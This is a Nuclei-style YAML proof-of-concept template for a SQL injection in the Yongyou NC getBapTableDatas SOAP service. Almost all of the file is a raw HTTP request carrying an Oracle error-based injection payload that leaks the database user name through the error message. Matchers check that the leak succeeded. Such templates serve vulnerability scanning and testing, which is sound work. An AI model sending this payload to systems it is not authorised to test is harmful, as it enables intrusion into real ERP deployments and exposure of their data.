folder-8/poc-yaml-yongyou-nc-getbaptabledatas-sqli.yaml

id: poc-yaml-yongyou-nc-getbaptabledatas-sqli
info:
  name: Yongyou NC getBapTableDatas SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - raw:
      - |
        POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <?xml version="1.0" encoding="UTF-8" standalone="no"?>
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
            <soapenv:Header/>
            <soapenv:Body>
                <gs:getBapTableDatas>
                    <gs:stringarrayItem>DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')-- abc</gs:stringarrayItem>
                </gs:getBapTableDatas>
            </soapenv:Body>
        </soapenv:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "未知的主机"
          - "SYS.UTL_INADDR"
      - type: regex
        part: body
        regex:
          - "~([0-9A-Za-z]+)~"
      - type: word
        part: header
        words:
          - "text/xml"
